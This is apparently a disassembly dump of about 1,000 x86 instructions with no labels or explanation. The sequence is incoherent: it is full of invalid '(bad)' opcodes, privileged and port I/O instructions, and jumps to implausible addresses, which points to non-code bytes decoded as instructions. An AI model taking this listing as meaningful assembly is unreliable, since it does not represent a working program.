  418cd4:	lods   al,BYTE PTR ss:[esi]
  418cd6:	sbb    BYTE PTR [ecx],dl
  418cd8:	sbb    eax,0xb774b20b
  418cdd:	mov    BYTE PTR [ebx],cl
  418cdf:	ins    BYTE PTR es:[edi],dx
  418ce0:	cmp    DWORD PTR [ebx+0x51],ebp
  418ce3:	daa    
  418ce4:	loopne 0x418d40
  418ce6:	and    esp,DWORD PTR [ebx-0x5e]
  418ce9:	mov    eax,0xa3ad38
  418cee:	or     BYTE PTR [ebp-0x4f268d5a],0x30
  418cf5:	sbb    DWORD PTR [ebx+ecx*8+0x16ec65df],edx
  418cfc:	jbe    0x418ca2
  418cfe:	mov    eax,ds:0x9f753c16
  418d03:	pop    ds
  418d04:	enter  0x8698,0x47
  418d08:	sahf   
  418d09:	repz pop esi
  418d0b:	dec    edi
  418d0c:	jle    0x418d6b
  418d0e:	lods   al,BYTE PTR ds:[esi]
  418d0f:	test   DWORD PTR ds:0x877c7425,ebx
  418d15:	stos   DWORD PTR es:[edi],eax
  418d16:	ds sbb al,0xe8
  418d19:	into   
  418d1a:	xchg   ecx,eax
  418d1b:	push   edx
  418d1c:	shl    DWORD PTR [ebp+esi*8-0x5f0cf26a],cl
  418d23:	nop
  418d24:	out    dx,eax
  418d25:	fistp  DWORD PTR [esi]
  418d27:	or     DWORD PTR [esi],edi
  418d29:	daa    
  418d2a:	test   BYTE PTR ds:0x64b48301,dh
  418d30:	inc    esp
  418d31:	cs retf 
  418d33:	dec    edx
  418d34:	int    0x7e
  418d36:	(bad)  
  418d37:	stc    
  418d38:	cmp    DWORD PTR [eax-0x54f5253a],0x6a5770ba
  418d42:	inc    edi
  418d43:	lock aas 
  418d45:	mov    ecx,edi
  418d47:	shl    dh,0xd2
  418d4a:	out    dx,al
  418d4b:	inc    esi
  418d4c:	dec    ebx
  418d4d:	retf   
  418d4e:	sub    esp,DWORD PTR [eax+0x2d]
  418d51:	xchg   BYTE PTR [edi-0x62],ch
  418d54:	out    0x67,eax
  418d56:	std    
  418d57:	mov    ah,0xc7
  418d59:	and    esi,DWORD PTR ds:0xa9c2c5aa
  418d5f:	popa   
  418d60:	dec    eax
  418d61:	push   0xfcaa9af5
  418d66:	loop   0x418dc0
  418d68:	xor    bl,ch
  418d6a:	out    dx,al
  418d6b:	or     edi,DWORD PTR [edx]
  418d6d:	pop    ecx
  418d6e:	jne    0x418d3c
  418d70:	aad    0x82
  418d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d73:	pop    edi
  418d74:	sub    dh,BYTE PTR [edx+0x4b80a000]
  418d7a:	lods   al,BYTE PTR ds:[esi]
  418d7b:	popf   
  418d7c:	adc    ebp,edi
  418d7e:	inc    ebx
  418d7f:	rcr    ah,cl
  418d81:	fidiv  WORD PTR [eax]
  418d83:	jo     0x418dd4
  418d85:	into   
  418d86:	fld    QWORD PTR ss:[ebp+edi*4+0x5475db0e]
  418d8e:	add    al,0x21
  418d90:	jge    0x418d2e
  418d92:	mov    ds,WORD PTR [edx]
  418d94:	cld    
  418d95:	pop    ss
  418d96:	pop    ecx
  418d97:	sahf   
  418d98:	rcl    DWORD PTR [ebx-0x1a],1
  418d9b:	sar    BYTE PTR [esi-0x5b],cl
  418d9e:	mov    BYTE PTR [ecx+ebp*2-0xc35ad68],0xf2
  418da6:	xor    BYTE PTR [esi-0x31],0x1b
  418daa:	pop    edi
  418dab:	inc    ecx
  418dac:	mov    ecx,0x880d3339
  418db1:	add    ah,cl
  418db3:	repz sbb ch,ah
  418db6:	sbb    al,0xa9
  418db8:	add    eax,0x8859821a
  418dbd:	cmp    al,0xb4
  418dbf:	jecxz  0x418dae
  418dc1:	mov    BYTE PTR [ebx-0x2f11ab98],dh
  418dc7:	call   0x47ef3531
  418dcc:	adc    DWORD PTR [ebx+0x319f94a4],ecx
  418dd2:	clc    
  418dd3:	ss mov edi,0xfa808611
  418dd9:	mov    ebp,0xa0c6d578
  418dde:	lock loopne 0x418e52
  418de1:	inc    edx
  418de2:	fst    DWORD PTR [edi+0x51]
  418de5:	sbb    al,0x98
  418de7:	(bad)  
  418de8:	out    0xc9,eax
  418dea:	test   dl,ch
  418dec:	aaa    
  418ded:	cmp    edx,DWORD PTR [edx-0x377a0846]
  418df3:	xchg   edi,eax
  418df4:	jge    0x418dd8
  418df6:	dec    ebx
  418df7:	and    al,BYTE PTR [esi-0x3c]
  418dfa:	add    esp,DWORD PTR [edx-0x69393f5a]
  418e00:	jle    0x7bb1149b
  418e06:	mov    ah,bl
  418e08:	pushf  
  418e09:	sbb    BYTE PTR [edi],bl
  418e0b:	pop    es
  418e0c:	cli    
  418e0d:	arpl   WORD PTR [eax],sp
  418e0f:	clc    
  418e10:	pop    ebp
  418e11:	jns    0x418e3d
  418e13:	scas   al,BYTE PTR es:[edi]
  418e14:	aad    0xb7
  418e16:	sub    eax,0xf0a6deb1
  418e1b:	dec    esi
  418e1c:	fisttp DWORD PTR [eax*2+0x248080b8]
  418e23:	xor    BYTE PTR [ebx+0x3e59e7f5],bh
  418e29:	or     edx,DWORD PTR [ecx-0x7d]
  418e2c:	pop    esi
  418e2d:	xor    edi,DWORD PTR [ebx+ebp*2]
  418e30:	in     eax,dx
  418e31:	and    al,0x9
  418e33:	push   ss
  418e34:	bound  edi,QWORD PTR [ecx-0x35]
  418e37:	mov    ds:0xa1e61032,al
  418e3c:	rcl    BYTE PTR [eax+ebp*8+0x7a],1
  418e40:	lock ins DWORD PTR es:[di],dx
  418e43:	lds    edx,FWORD PTR [edi-0x13]
  418e46:	pop    es
  418e47:	push   cs
  418e48:	xchg   DWORD PTR [esi-0x4cb85ea6],edx
  418e4e:	inc    eax
  418e4f:	retf   
  418e50:	leave  
  418e51:	repz cs pop esi
  418e54:	in     al,0x96
  418e56:	ror    BYTE PTR [ebx-0x3c],0x72
  418e5a:	dec    ecx
  418e5b:	sti    
  418e5c:	and    al,0x9f
  418e5e:	xchg   BYTE PTR [edx],dl
  418e60:	xchg   edx,eax
  418e61:	pop    ss
  418e62:	cmp    eax,ecx
  418e64:	ret    0xd9ec
  418e67:	mov    ds:0x565d9bb4,eax
  418e6c:	xchg   ebx,eax
  418e6d:	mov    BYTE PTR [ebp+0x41],ah
  418e70:	pop    edx
  418e72:	add    eax,0x68068f88
  418e77:	mov    esp,0x6a83709d
  418e7c:	test   al,0xc7
  418e7e:	retf   
  418e7f:	std    
  418e80:	fild   WORD PTR [ecx]
  418e82:	mov    ds:0x7778e8d7,eax
  418e87:	xchg   esi,eax
  418e88:	addr16 dec esp
  418e8a:	pop    esp
  418e8b:	mov    cl,ah
  418e8d:	iret   
  418e8e:	jl     0x418e23
  418e90:	jmp    0xcb529071
  418e95:	mov    ds:0xf2590513,eax
  418e9a:	add    al,0xdb
  418e9c:	inc    esp
  418e9d:	sbb    bh,al
  418e9f:	(bad)  
  418ea0:	mov    al,0x25
  418ea2:	je     0x418e59
  418ea4:	cwde   
  418ea5:	ja     0x418ea8
  418ea7:	inc    ebp
  418ea8:	mov    bh,0x4a
  418eaa:	inc    esi
  418eab:	imul   ecx,DWORD PTR [esi+esi*1-0x12],0xea2ee395
  418eb3:	add    esp,DWORD PTR [edi+0x5da65ce7]
  418eb9:	inc    esp
  418eba:	sahf   
  418ebb:	add    al,0xe2
  418ebd:	xchg   edx,eax
  418ebe:	inc    esi
  418ebf:	lods   eax,DWORD PTR ds:[esi]
  418ec0:	sub    DWORD PTR [edx+0x7f2e9d3c],0x50
  418ec7:	das    
  418ec8:	leave  
  418ec9:	mov    WORD PTR [ebx+0x28213b5a],fs
  418ecf:	aad    0x64
  418ed1:	mov    edx,0xdc852004
  418ed6:	fdivr  QWORD PTR [ebp+0x5dd8f7ca]
  418edc:	bound  esp,QWORD PTR [esi-0x542f2771]
  418ee2:	xchg   esi,eax
  418ee3:	lock xchg edx,eax
  418ee5:	and    eax,0x59d09990
  418eea:	inc    ebp
  418eeb:	pop    esi
  418eec:	push   esi
  418eed:	xlat   BYTE PTR ds:[ebx]
  418eee:	push   eax
  418eef:	add    DWORD PTR [esi+0x4ef2ec61],edi
  418ef5:	fwait
  418ef6:	rcl    esp,1
  418ef8:	mov    WORD PTR [edi-0x68],cs
  418efb:	ret    
  418efc:	fldcw  WORD PTR [ebx-0x45601d3c]
  418f02:	sar    al,1
  418f04:	scas   al,BYTE PTR es:[edi]
  418f05:	add    BYTE PTR [ebx-0x7878d260],dh
  418f0b:	and    edx,ebx
  418f0d:	cmp    eax,0x48400cb1
  418f12:	int3   
  418f13:	pop    eax
  418f14:	mov    cl,0x6
  418f16:	adc    eax,0xc2f2872f
  418f1b:	pop    ebp
  418f1c:	pop    ss
  418f1d:	ins    DWORD PTR es:[edi],dx
  418f1e:	cmp    ecx,DWORD PTR [eax-0x6250a85b]
  418f24:	jle    0x418f5e
  418f26:	loope  0x418ee1
  418f28:	hlt    
  418f29:	mov    WORD PTR [ebx+0x59],fs
  418f2c:	ret    
  418f2d:	(bad)  
  418f2e:	push   ebx
  418f2f:	int3   
  418f30:	mov    al,ds:0x5c5777ea
  418f35:	dec    eax
  418f36:	xchg   esp,eax
  418f37:	dec    ebp
  418f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f39:	imul   DWORD PTR [edx+0x75]
  418f3c:	into   
  418f3d:	push   esi
  418f3e:	in     al,0xf3
  418f40:	js     0x418edd
  418f42:	outs   dx,BYTE PTR ds:[esi]
  418f43:	(bad)  
  418f44:	sbb    cl,cl
  418f46:	push   0xab87f8
  418f4b:	in     eax,dx
  418f4c:	cmc    
  418f4d:	(bad)  
  418f4e:	adc    dl,BYTE PTR [eax-0x16c00a33]
  418f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f55:	pop    ebx
  418f56:	add    ch,BYTE PTR [eax]
  418f58:	icebp  
  418f59:	outs   dx,BYTE PTR ds:[esi]
  418f5a:	mov    eax,ds:0xcb8a4e91
  418f5f:	and    ebx,DWORD PTR [ebx]
  418f61:	int3   
  418f62:	stc    
  418f63:	out    0x5f,eax
  418f65:	aad    0xff
  418f67:	shr    DWORD PTR [edx-0x34],0x28
  418f6b:	pop    ss
  418f6c:	xor    edi,ecx
  418f6e:	mov    bl,0x1
  418f70:	nop
  418f71:	stc    
  418f72:	pop    es
  418f73:	es inc edi
  418f75:	int    0xc7
  418f77:	popf   
  418f78:	jl     0x418f81
  418f7a:	scas   al,BYTE PTR es:[edi]
  418f7b:	adc    esp,DWORD PTR [edx*4+0x5aa553eb]
  418f82:	add    eax,0x14975e04
  418f87:	hlt    
  418f88:	jl     0x418f41
  418f8a:	shrd   DWORD PTR [eax+0x2b],eax,cl
  418f8e:	jmp    0xeb98:0x2c29e597
  418f95:	test   ah,cl
  418f97:	push   cs
  418f98:	nop
  418f99:	add    DWORD PTR [edi-0x352e8ca8],edi
  418f9f:	test   eax,0x4bc4105e
  418fa4:	pushf  
  418fa5:	(bad)  
  418fa6:	in     eax,dx
  418fa7:	ins    DWORD PTR es:[edi],dx
  418fa8:	aaa    
  418fa9:	sbb    al,0x3b
  418fab:	sub    BYTE PTR [edx+0x41b5b7ac],cl
  418fb1:	(bad)  
  418fb2:	test   al,0xa1
  418fb4:	jecxz  0x418f60
  418fb6:	(bad)  [ebp-0x376b29b0]
  418fbc:	or     BYTE PTR [edx],al
  418fbe:	dec    ebp
  418fbf:	jbe    0x418fc7
  418fc1:	inc    ecx
  418fc2:	dec    edi
  418fc3:	fist   DWORD PTR [edi-0x6be6773e]
  418fc9:	pusha  
  418fca:	jp     0x418fc2
  418fcc:	inc    edi
  418fcd:	push   esi
  418fce:	dec    eax
  418fcf:	cli    
  418fd0:	sti    
  418fd1:	sar    ebx,0x75
  418fd4:	mov    eax,DWORD PTR [esi+0x68]
  418fd7:	jecxz  0x418fe1
  418fd9:	add    DWORD PTR [esi+0x17],0x3a
  418fdd:	scas   al,BYTE PTR es:[edi]
  418fde:	dec    eax
  418fdf:	add    BYTE PTR [ebp+0xe],0xb8
  418fe3:	fs mov al,cl
  418fe6:	imul   eax,ebx,0x43bb5b03
  418fec:	in     al,0x79
  418fee:	lds    ecx,FWORD PTR [bp-0x5e]
  418ff2:	push   esp
  418ff3:	push   ecx
  418ff4:	mov    WORD PTR [edx],ds
  418ff6:	out    0xeb,al
  418ff8:	add    bh,BYTE PTR [ebx+0x45d3d33f]
  418ffe:	jl     0x418f85
  419000:	iret   
  419001:	sbb    eax,0x83177912
  419006:	popf   
  419007:	lock push esp
  419009:	xor    DWORD PTR [edx],esp
  41900b:	pop    ss
  41900c:	cmp    DWORD PTR [edi+0x7c87012c],esp
  419012:	out    dx,al
  419013:	rol    DWORD PTR [eax+ebx*8-0x587af9f9],0x91
  41901b:	loop   0x41901f
  41901d:	mov    esp,0x455e28dd
  419022:	pop    esi
  419023:	inc    ebx
  419024:	loop   0x418fc0
  419026:	inc    ebp
  419027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419028:	arpl   ax,sp
  41902a:	jg     0x419007
  41902c:	pop    ecx
  41902d:	(bad)  
  41902e:	fs fld st(5)
  419031:	loopne 0x419006
  419033:	xchg   DWORD PTR [eax],ebx
  419035:	test   al,0xab
  419037:	cmp    esp,DWORD PTR [edx-0x7f]
  41903a:	jmp    0x3bf4:0x77a014d1
  419041:	jns    0x419098
  419043:	hlt    
  419044:	ins    DWORD PTR es:[edi],dx
  419045:	push   esp
  419046:	sub    eax,0x47d6b44b
  41904b:	xor    DWORD PTR [esi],ecx
  41904d:	mov    dl,0x87
  41904f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419050:	lods   eax,DWORD PTR ds:[esi]
  419051:	call   0x4415:0x8d9ff433
  419058:	jp     0x419047
  41905a:	cmp    DWORD PTR [ebx],ebp
  41905c:	xchg   ebx,eax
  41905d:	cmp    BYTE PTR [eax-0x56],al
  419060:	jae    0x419016
  419062:	cmp    eax,0x7c2052d3
  419067:	xchg   esi,eax
  419068:	test   DWORD PTR [ecx+ecx*2+0x512ea954],eax
  41906f:	mov    edi,0x7f0874b0
  419074:	aad    0x3a
  419076:	sahf   
  419077:	cmc    
  419078:	sti    
  419079:	cwde   
  41907a:	call   0xfc0a:0x552896a9
  419081:	loop   0x41906d
  419083:	ss xchg ebx,eax
  419085:	inc    edx
  419086:	mov    eax,ds:0x4e4f8ac1
  41908b:	(bad)  
  41908c:	ss mov esp,0xdadd6d13
  419092:	retf   
  419093:	cdq    
  419094:	mov    WORD PTR [ebx+0x36],?
  419097:	push   ds
  419098:	xchg   ecx,eax
  419099:	xchg   ebp,eax
  41909a:	loope  0x4190af
  41909c:	jle    0x419079
  41909e:	push   ebp
  41909f:	int    0xfa
  4190a1:	or     al,0xee
  4190a3:	sbb    BYTE PTR [edx+0x4cce7d73],dh
  4190a9:	shl    bl,1
  4190ab:	mov    bl,0xfb
  4190ad:	mov    ah,BYTE PTR [esi]
  4190af:	xchg   DWORD PTR [eax-0x39b975d],ecx
  4190b5:	xlat   BYTE PTR ds:[ebx]
  4190b6:	bnd js 0x41912a
  4190b9:	jmp    DWORD PTR [edx+0x6881c0ff]
  4190bf:	and    eax,0x16cdfe72
  4190c4:	jp     0x4190d1
  4190c6:	adc    eax,0x7d399334
  4190cb:	call   0x9e006f46
  4190d0:	lods   al,BYTE PTR ds:[esi]
  4190d1:	jae    0x419068
  4190d3:	gs mov dl,0xdf
  4190d6:	jg     0x4190a8
  4190d8:	cmp    cl,bh
  4190da:	mov    esi,0xfb1eb023
  4190df:	mov    ebp,0xb6fdf01e
  4190e4:	cmc    
  4190e5:	jle    0x419086
  4190e7:	dec    esp
  4190e8:	(bad)  
  4190ea:	fldcw  WORD PTR [edi+ebp*4+0x735cba3d]
  4190f1:	shl    esp,0x66
  4190f4:	test   eax,0x1d93fb0f
  4190f9:	mov    ?,WORD PTR ds:0x4c21f0f
  4190ff:	loopne 0x4190a4
  419101:	hlt    
  419102:	arpl   WORD PTR [edi+0x6e2b1d11],ax
  419108:	xchg   edi,eax
  419109:	aad    0xa4
  41910b:	cmp    cl,BYTE PTR [ecx+0x5b]
  41910e:	das    
  41910f:	(bad)
  419112:	mov    ecx,0x228cf2f2
  419117:	pusha  
  419118:	jle    0x41916a
  41911a:	fisttp QWORD PTR [edi-0x6c]
  41911d:	or     eax,0x3f10f124
  419122:	push   edi
  419123:	push   esp
  419124:	cdq    
  419125:	retf   
  419126:	inc    ecx
  419127:	ss call 0x17e2:0xf9aa7ac
  41912f:	ror    DWORD PTR [edx],cl
  419131:	add    eax,0x8a26724a
  419136:	sub    bh,cl
  419138:	mov    dl,0xd1
  41913a:	inc    ecx
  41913b:	push   eax
  41913c:	mov    al,0xe7
  41913e:	adc    eax,0x75405936
  419143:	dec    ebp
  419144:	sub    bh,BYTE PTR ds:0x4cf34cfe
  41914a:	or     esi,0xf
  41914d:	shl    DWORD PTR [ecx-0x3eba8ab8],1
  419153:	aad    0x6b
  419155:	xor    eax,0x71543804
  41915a:	lock mov ds:0x87587e95,eax
  419160:	outs   dx,DWORD PTR ds:[esi]
  419161:	lahf   
  419162:	rol    DWORD PTR [edi+0x16],1
  419165:	and    bh,BYTE PTR [ebx+ebx*8]
  419168:	xchg   BYTE PTR [ebx-0x44],ch
  41916b:	sbb    eax,0xb634f99f
  419170:	aad    0x2b
  419172:	retf   
  419173:	(bad)  
  419175:	xchg   ebx,eax
  419176:	in     al,dx
  419177:	out    dx,eax
  419178:	mov    bl,0xd6
  41917a:	aam    0x4b
  41917c:	pusha  
  41917d:	sbb    DWORD PTR [ebx+esi*4-0xa],ebx
  419181:	mov    dh,0x68
  419183:	mov    ds:0xe85c4d53,al
  419188:	push   0xea17cb11
  41918d:	adc    eax,0x87a4b54f
  419192:	fisttp WORD PTR [eax-0x665e4b65]
  419198:	fcmovb st,st(1)
  41919a:	mov    ah,al
  41919c:	cmp    bl,BYTE PTR [edi*1+0x57febbff]
  4191a3:	and    al,0x14
  4191a5:	inc    esp
  4191a6:	loopne 0x4191a4
  4191a8:	stc    
  4191a9:	adc    eax,0x62a82686
  4191ae:	iret   
  4191af:	cwde   
  4191b0:	ins    BYTE PTR es:[edi],dx
  4191b1:	in     al,dx
  4191b2:	pusha  
  4191b3:	mov    ?,WORD PTR [edi+0x2a]
  4191b6:	fist   WORD PTR [esi]
  4191b8:	xor    BYTE PTR [edx],0x98
  4191bb:	mov    ebx,0xb6a33cf4
  4191c0:	shr    DWORD PTR [edx],0xcb
  4191c3:	leave  
  4191c4:	and    edi,DWORD PTR [ecx+ecx*8+0x5b0a1144]
  4191cb:	xor    eax,0x52e4ff43
  4191d0:	mov    dl,dh
  4191d2:	add    ebp,DWORD PTR [ecx]
  4191d4:	paddusb mm2,QWORD PTR [eax]
  4191d7:	in     eax,0x6a
  4191d9:	dec    esp
  4191da:	test   BYTE PTR [edx+0x51f7e66b],ah
  4191e0:	pop    ds
  4191e1:	sub    eax,0x6da7b4d6
  4191e6:	adc    al,0x34
  4191e8:	dec    esi
  4191e9:	cmp    ch,BYTE PTR [edi+0x58]
  4191ec:	jae    0x41921f
  4191ee:	add    cl,BYTE PTR [ebx]
  4191f0:	jnp    0x4191f2
  4191f2:	scas   eax,DWORD PTR es:[edi]
  4191f3:	push   edi
  4191f4:	cli    
  4191f5:	mov    ds:0xb5d8311f,eax
  4191fa:	in     eax,dx
  4191fb:	ror    eax,cl
  4191fd:	test   DWORD PTR [eax+eiz*2-0x2c],ebp
  419201:	(bad)  
  419202:	imul   edx,esi,0x2c
  419205:	pushf  
  419206:	and    ebx,DWORD PTR [eax+eiz*4+0x78876125]
  41920d:	sub    dl,ch
  41920f:	xchg   ebx,eax
  419210:	pop    edi
  419211:	jmp    0xcc5fb1c0
  419216:	pushf  
  419217:	or     ah,dh
  419219:	pop    edi
  41921a:	or     eax,eax
  41921c:	out    0x2b,al
  41921e:	mov    bl,0xc
  419220:	icebp  
  419221:	push   edx
  419222:	adc    eax,0xfc1ad521
  419227:	ret    
  419228:	and    esi,DWORD PTR [ecx+0x4]
  41922b:	stos   BYTE PTR es:[edi],al
  41922c:	jmp    0x74ad00a8
  419231:	xor    al,0x79
  419233:	scas   al,BYTE PTR es:[edi]
  419234:	dec    esp
  419235:	out    dx,al
  419236:	iret   
  419237:	dec    ecx
  419238:	xchg   BYTE PTR [edx],al
  41923a:	sub    DWORD PTR [edx],ebx
  41923c:	or     al,0xcc
  41923e:	jne    0x4191f0
  419240:	enter  0x8e36,0x20
  419244:	and    dl,BYTE PTR [edi+0x6fbc7016]
  41924a:	imul   ecx,DWORD PTR [edi-0x2ffacf0f],0xffffffda
  419251:	repnz adc edx,edx
  419254:	adc    dh,cl
  419256:	and    dh,BYTE PTR [esi-0x62a0a38]
  41925c:	arpl   bx,bx
  41925e:	pop    ecx
  41925f:	sahf   
  419260:	push   0xf93d4f03
  419265:	inc    edi
  419266:	leave  
  419267:	out    dx,eax
  419268:	jno    0x419263
  41926a:	jmp    0x844d:0x6629a6c6
  419271:	in     al,0x30
  419273:	and    edi,DWORD PTR [ebp+0xcf0b802]
  419279:	fs xchg ebp,esi
  41927c:	mov    dl,0x43
  41927e:	push   edx
  41927f:	pop    edi
  419280:	sub    dh,cl
  419282:	sub    eax,0xb6622ff6
  419287:	ret    
  419288:	jmp    0x9be09b08
  41928d:	stos   DWORD PTR es:[edi],eax
  41928e:	gs xchg ebp,eax
  419290:	dec    ebx
  419291:	pusha  
  419292:	pushf  
  419293:	sub    al,0xaa
  419295:	or     ebp,DWORD PTR [edi]
  419297:	sub    eax,0xee532bf9
  41929c:	inc    ebp
  41929d:	icebp  
  41929e:	mov    bh,0x61
  4192a0:	lods   al,BYTE PTR ds:[esi]
  4192a1:	jmp    0x41930a
  4192a3:	sbb    bh,ah
  4192a5:	(bad)  
  4192a6:	sub    eax,0xdcd0db34
  4192ab:	mov    cl,0xf4
  4192ad:	sbb    ecx,DWORD PTR [esi]
  4192af:	ins    BYTE PTR es:[edi],dx
  4192b0:	jb     0x4192b5
  4192b2:	popa   
  4192b3:	gs dec edx
  4192b5:	push   ecx
  4192b6:	outs   dx,DWORD PTR ds:[esi]
  4192b7:	mov    ch,0x70
  4192b9:	cwde   
  4192ba:	pop    ebx
  4192bb:	bnd jne 0x419260
  4192be:	cmp    DWORD PTR [ebx+0x3169d92d],edx
  4192c4:	mov    ds:0x6603c7a,al
  4192c9:	fist   DWORD PTR [edi]
  4192cb:	pop    edi
  4192cc:	jno    0x4192c2
  4192ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192cf:	inc    ebx
  4192d0:	push   0x4b
  4192d2:	rol    DWORD PTR [edi-0x41ba110],1
  4192d8:	ror    DWORD PTR [esi+0x23adcceb],0x5
  4192df:	jbe    0x419319
  4192e1:	lds    esp,FWORD PTR ds:0xb7349111
  4192e7:	and    BYTE PTR [eax],cl
  4192e9:	jle    0x41934c
  4192eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192ec:	bound  ecx,QWORD PTR [edx+0x345189d8]
  4192f2:	retf   0x818c
  4192f5:	xor    esi,edx
  4192f7:	leave  
  4192f8:	mov    eax,0x7ca09032
  4192fd:	outs   dx,BYTE PTR ds:[esi]
  4192fe:	les    esi,FWORD PTR [ecx-0x6c]
  419301:	loope  0x41935d
  419303:	(bad)  
  419304:	repz int 0x7d
  419307:	retf   0x2e4
  41930a:	mov    edx,0x89c645fc
  41930f:	fild   QWORD PTR [eax-0x2b89ea33]
  419315:	and    DWORD PTR [edx*8-0xbb8cee5],ebx
  41931c:	(bad)  
  41931d:	or     al,0xde
  41931f:	mov    edi,0xa1a6296f
  419324:	loope  0x4192eb
  419326:	cli    
  419327:	sbb    DWORD PTR [edi+0x4bc95165],edx
  41932d:	jbe    0x4192de
  41932f:	retf   
  419330:	sahf   
  419331:	popa   
  419332:	imul   ecx,DWORD PTR [ecx],0x76
  419335:	fidiv  WORD PTR [edx]
  419337:	mov    ecx,DWORD PTR [eax]
  419339:	adc    eax,DWORD PTR [ebp+0x62c376ab]
  41933f:	dec    edi
  419340:	adc    al,0xd1
  419342:	loop   0x419382
  419344:	mov    ebp,edx
  419346:	push   esi
  419347:	addr16 jno 0x419379
  41934a:	test   al,0x38
  41934c:	fild   DWORD PTR [edx-0x1a]
  41934f:	(bad)  
  419350:	cli    
  419351:	in     al,0x37
  419353:	loope  0x419356
  419355:	loop   0x4192e8
  419357:	cli    
  419358:	hlt    
  419359:	or     eax,0x578444f2
  41935e:	scas   eax,DWORD PTR es:[edi]
  41935f:	push   esi
  419360:	les    ebp,FWORD PTR [edx+eax*2+0x69d20e8b]
  419367:	and    BYTE PTR [esi+ecx*4],cl
  41936a:	and    al,0x90
  41936c:	jmp    0x419375
  41936e:	sub    al,0xf8
  419370:	mov    esi,0xf8ddc65a
  419375:	dec    edx
  419376:	mov    edi,0x16ec4ff9
  41937b:	push   edi
  41937c:	fldcw  WORD PTR [ebx-0xc556bfe]
  419382:	mov    DWORD PTR [ebp+0x6b],ebp
  419385:	loopne 0x4193fc
  419387:	jo     0x4193ac
  419389:	xor    BYTE PTR [esi+0x68],bh
  41938c:	jmp    0x419380
  41938e:	push   es
  41938f:	xor    al,0x72
  419391:	mov    ebp,0x6226f4ff
  419396:	lahf   
  419397:	xchg   esp,eax
  419398:	fsub   QWORD PTR [ecx]
  41939a:	pop    ebx
  41939b:	scas   al,BYTE PTR es:[edi]
  41939c:	imul   ebp,DWORD PTR [edi+0x38fa0093],0xffffffdc
  4193a3:	cmc    
  4193a4:	cwde   
  4193a5:	dec    esi
  4193a6:	lds    esi,FWORD PTR [ecx-0x52]
  4193a9:	cld    
  4193aa:	pop    ebp
  4193ab:	iret   
  4193ac:	fwait
  4193ad:	outs   dx,BYTE PTR ds:[esi]
  4193ae:	push   0x28242126
  4193b3:	mov    bh,0x8
  4193b5:	nop
  4193b6:	push   edi
  4193b7:	xchg   ebp,eax
  4193b8:	push   ecx
  4193b9:	test   DWORD PTR [edi-0x27],0x31e9c09c
  4193c0:	std    
  4193c1:	lahf   
  4193c2:	outs   dx,DWORD PTR ds:[esi]
  4193c3:	sbb    edi,DWORD PTR [esp+ebx*2]
  4193c6:	lahf   
  4193c7:	push   esp
  4193c8:	fucomp st(5)
  4193ca:	and    DWORD PTR [ebp-0x5b],ecx
  4193cd:	in     al,dx
  4193ce:	sbb    DWORD PTR [edi+0x3109d5a2],0x6d0fa25b
  4193d8:	mov    WORD PTR [edi],es
  4193da:	in     eax,0xc8
  4193dc:	adc    ebx,0x1ae2f132
  4193e2:	cld    
  4193e3:	mov    ch,0x45
  4193e5:	fiadd  DWORD PTR [eax]
  4193e7:	shl    BYTE PTR [eax+0x7b7d0652],0xcd
  4193ee:	jno    0x41940e
  4193f0:	enter  0xf63c,0xbf
  4193f4:	jae    0x41938e
  4193f6:	jp     0x419378
  4193f8:	xchg   ecx,eax
  4193f9:	pop    edi
  4193fa:	sbb    BYTE PTR [ebx+0x63],cl
  4193fd:	sbb    esp,ebp
  4193ff:	(bad)  
  419400:	outs   dx,DWORD PTR ds:[esi]
  419401:	nop
  419402:	and    al,0x7d
  419404:	adc    bl,bh
  419406:	jmp    0x4193e3
  419408:	jno    0x41946c
  41940a:	aas    
  41940b:	sbb    BYTE PTR [ebp-0x52748882],cl
  419411:	or     BYTE PTR [edi],al
  419413:	je     0x41939b
  419415:	or     dh,al
  419417:	ja     0x41941d
  419419:	in     al,0xc2
  41941b:	add    esi,esi
  41941d:	or     eax,0x55e71e06
  419422:	rcr    DWORD PTR [edx+0x47],0xb5
  419426:	cmp    ah,0x91
  419429:	fdivr  DWORD PTR [eax]
  41942b:	gs dec esp
  41942d:	fstp   QWORD PTR ds:0x7fcbedcd
  419433:	outs   dx,BYTE PTR cs:[esi]
  419435:	and    BYTE PTR [ebp+ecx*1+0x3d],0xc0
  41943a:	iret   
  41943b:	sbb    DWORD PTR [eax],esi
  41943d:	add    eax,ebx
  41943f:	dec    ebx
  419440:	push   cs
  419441:	cli    
  419442:	sub    BYTE PTR [ecx],0x46
  419445:	xchg   ebp,eax
  419446:	push   0x69
  419448:	lock ret 0x1642
  41944c:	jmp    0x2f24:0x355fb985
  419453:	add    al,0x32
  419455:	pushf  
  419456:	or     eax,0x5bf55de
  41945b:	xor    eax,0x1d1ae864
  419460:	sub    ah,BYTE PTR [ebp+0xc66fe64]
  419466:	jmp    0x4cc0:0xe0fbce85
  41946d:	dec    esp
  41946e:	mov    al,BYTE PTR [edi+0x44728fe5]
  419474:	imul   ebp,DWORD PTR [eax-0x565934b],0x1cee7765
  41947e:	in     eax,dx
  41947f:	test   BYTE PTR [eax+0x11e1696],0x5f
  419486:	jp     0x419421
  419488:	or     al,0x2e
  41948a:	(bad)  
  41948b:	loopne 0x4194b1
  41948d:	sbb    bh,0xe5
  419490:	loope  0x419437
  419492:	aaa    
  419493:	stos   BYTE PTR es:[edi],al
  419494:	xchg   bl,cl
  419496:	dec    ecx
  419497:	mov    esi,esp
  419499:	popa   
  41949a:	mov    dl,0x60
  41949c:	mov    edi,0xcb7fd03a
  4194a2:	mov    eax,ds:0xcf49217a
  4194a7:	popa   
  4194a8:	shl    BYTE PTR [eax+0x2f65b40b],0xd2
  4194af:	cmp    esi,DWORD PTR [eax]
  4194b1:	ds loop 0x419526
  4194b4:	jns    0x419510
  4194b6:	mov    WORD PTR ds:0xe577eac9,ss
  4194bc:	fmul   DWORD PTR [ecx-0x77]
  4194bf:	mov    edx,0xf4586c49
  4194c4:	inc    esi
  4194c5:	or     dh,ch
  4194c7:	fsin   
  4194c9:	push   esp
  4194ca:	in     al,dx
  4194cb:	loop   0x419460
  4194cd:	pop    ebp
  4194ce:	mov    edx,0x22fbc8b7
